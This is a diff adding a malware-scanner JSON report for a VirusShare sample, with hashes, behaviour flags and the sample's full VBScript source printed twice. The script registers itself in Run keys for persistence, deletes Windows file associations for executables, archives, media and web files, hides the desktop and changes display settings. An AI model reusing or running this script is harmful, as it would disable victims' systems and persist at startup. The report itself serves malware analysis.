@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On error Resume next\nDim RipReg\nSet RipReg = WScript.CreateObject(\"WScript.Shell\")\nRipME = WScript.Scriptfullname\nRipReg.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\inet\", RipMe\nRipReg.RegDelete \"HKCR\\.exe\\\"\nRipReg.RegDelete \"HKCR\\.com\\\"\nRipReg.RegWrite \"HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\info\", RipMe\nRipReg.RegDelete \"HKCR\\.dll\\\"\nRipReg.RegDelete \"HKCR\\.jpg\\\"\nRipReg.RegDelete \"HKCR\\.html\\\"\nRipReg.RegWrite \"HKCU\\Software\\Microsoft\\CurrentVersion\\Policies\\Explorer\\NoDesktop\", \"1\"\nRipReg.RegDelete \"HKCR\\.pwl\\\"\nRipReg.RegDelete \"HKCR\\.bat\\\"\nRipReg.RegWrite \"HKCC\\Display\\Settings\\Resolution\", \"300,200\"\nRipReg.RegDelete \"HKCR\\.mpg\\\"\nRipReg.RegDelete \"HKCR\\.mpeg\\\"\nRipReg.RegDelete \"HKCR\\.avi\\\"\nRipReg.RegDelete \"HKCR\\.zip\\\"\nRipReg.RegDelete \"HKCR\\.rar\\\"\nRipReg.RegDelete \"HKCR\\.cab\\\"\nRipReg.RegDelete \"HKCR\\.gif\\\"\nRipReg.RegDelete \"HKCR\\.eml\\\"\nRipReg.RegDelete \"HKCR\\.bmp\\\"\nRipReg.RegDelete \"HKCR\\http\\\"\nRipReg.RegDelete \"HKCR\\.htm\\\"\n"
+    },
+    "filename": "VirusShare_d93d4a08a658507ce53b1fa645a7cfb5",
+    "filesize": 1013,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "d93d4a08a658507ce53b1fa645a7cfb5",
+        "sha1": "140cb4442242c77ccd5acc4d32416ca8868264e3",
+        "sha256": "1fdf57acc2d089f766cb82e3c72fd8a99996de25bd5c8954891c52bb0aa5ea0e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On error Resume next",
+            "Dim RipReg",
+            "Set RipReg = WScript.CreateObject(\"WScript.Shell\")",
+            "RipME = WScript.Scriptfullname",
+            "RipReg.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\inet\", RipMe",
+            "RipReg.RegDelete \"HKCR\\.exe\\\"",
+            "RipReg.RegDelete \"HKCR\\.com\\\"",
+            "RipReg.RegWrite \"HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\info\", RipMe",
+            "RipReg.RegDelete \"HKCR\\.dll\\\"",
+            "RipReg.RegDelete \"HKCR\\.jpg\\\"",
+            "RipReg.RegDelete \"HKCR\\.html\\\"",
+            "RipReg.RegWrite \"HKCU\\Software\\Microsoft\\CurrentVersion\\Policies\\Explorer\\NoDesktop\", \"1\"",
+            "RipReg.RegDelete \"HKCR\\.pwl\\\"",
+            "RipReg.RegDelete \"HKCR\\.bat\\\"",
+            "RipReg.RegWrite \"HKCC\\Display\\Settings\\Resolution\", \"300,200\"",
+            "RipReg.RegDelete \"HKCR\\.mpg\\\"",
+            "RipReg.RegDelete \"HKCR\\.mpeg\\\"",
+            "RipReg.RegDelete \"HKCR\\.avi\\\"",
+            "RipReg.RegDelete \"HKCR\\.zip\\\"",
+            "RipReg.RegDelete \"HKCR\\.rar\\\"",
+            "RipReg.RegDelete \"HKCR\\.cab\\\"",
+            "RipReg.RegDelete \"HKCR\\.gif\\\"",
+            "RipReg.RegDelete \"HKCR\\.eml\\\"",
+            "RipReg.RegDelete \"HKCR\\.bmp\\\"",
+            "RipReg.RegDelete \"HKCR\\http\\\"",
+            "RipReg.RegDelete \"HKCR\\.htm\\\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274338",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
